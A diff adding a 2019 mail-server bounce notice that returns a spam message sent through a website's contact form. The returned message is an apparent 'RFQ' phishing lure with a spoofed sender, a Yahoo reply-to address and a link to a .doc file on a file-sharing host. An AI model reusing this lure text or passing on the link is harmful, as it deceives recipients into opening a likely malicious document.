@@ -1,0 +1,83 @@
+Return-Path: <>
+Delivered-To: injuldom@single-priva8.privatednsorg.com
+Received: from single-priva8.privatednsorg.com
+	by single-priva8.privatednsorg.com with LMTP
+	id sL+vIbafiV1tzQ0A6bADhg
+	(envelope-from <>)
+	for <injuldom@single-priva8.privatednsorg.com>; Tue, 24 Sep 2019 00:46:46 -0400
+Return-path: <>
+Envelope-to: injuldom@single-priva8.privatednsorg.com
+Delivery-date: Tue, 24 Sep 2019 00:46:46 -0400
+Received: from mailnull by single-priva8.privatednsorg.com with local (Exim 4.92)
+	id 1iCcis-003vmB-H2
+	for injuldom@single-priva8.privatednsorg.com; Tue, 24 Sep 2019 00:46:46 -0400
+X-Failed-Recipients: info@injul.com.do
+Auto-Submitted: auto-replied
+From: Mail Delivery System <Mailer-Daemon@single-priva8.privatednsorg.com>
+To: injuldom@single-priva8.privatednsorg.com
+Content-Type: multipart/report; report-type=delivery-status; boundary=1569300406-eximdsn-1439518729
+MIME-Version: 1.0
+Subject: Mail delivery failed: returning message to sender
+Message-Id: <E1iCcis-003vmB-H2@single-priva8.privatednsorg.com>
+Date: Tue, 24 Sep 2019 00:46:46 -0400
+
+--1569300406-eximdsn-1439518729
+Content-type: text/plain; charset=us-ascii
+
+This message was created automatically by mail delivery software.
+
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
+
+  info@injul.com.do
+    No Such User Here
+
+--1569300406-eximdsn-1439518729
+Content-type: message/delivery-status
+
+Reporting-MTA: dns; single-priva8.privatednsorg.com
+
+Action: failed
+Final-Recipient: rfc822;info@injul.com.do
+Status: 5.0.0
+
+--1569300406-eximdsn-1439518729
+Content-type: message/rfc822
+
+Return-path: <injuldom@single-priva8.privatednsorg.com>
+Received: from injuldom by single-priva8.privatednsorg.com with local (Exim 4.92)
+	(envelope-from <injuldom@single-priva8.privatednsorg.com>)
+	id 1iCcis-003vlx-FL
+	for info@injul.com.do; Tue, 24 Sep 2019 00:46:46 -0400
+To: info@injul.com.do
+Subject: www.injul.com.do "RE: RFQ ( KARQ000000034 & KARQ000000038 )#"
+X-PHP-Script: injul.com.do/index.php for 37.120.217.14
+Date: Tue, 24 Sep 2019 04:46:46 +0000
+From: Robertchoke <info@injul.com.do>
+Reply-To: frankyzulike@yahoo.com
+Message-ID: <71440b4ae1e23f909a722702b290743f@injul.com.do>
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+From: Robertchoke <frankyzulike@yahoo.com>
+Subject: RE: RFQ ( KARQ000000034 & KARQ000000038 )#
+
+Message Body:
+Dear Sirs, 
+Kindly send me your best quotation for Mention request. 
+And Also please to insure that the quotation will be include the following Point’s see below link for your reference. 
+https://file.fm/down.php?cf&i=gesxp9na&n=11447708.doc 
+ 
+Thanks for your understanding and cooperation with us. 
+ 
+With my Best Regard 
+ 
+Note: To protect against computer viruses, e-mail programs may prevent sending or receiving certain types of file attachments.  Check your e-mail security settings to determine how attachments are handled.
+
+-- 
+This e-mail was sent from a contact form on www.injul.com.do (http://injul.com.do)
+
+
+--1569300406-eximdsn-1439518729--
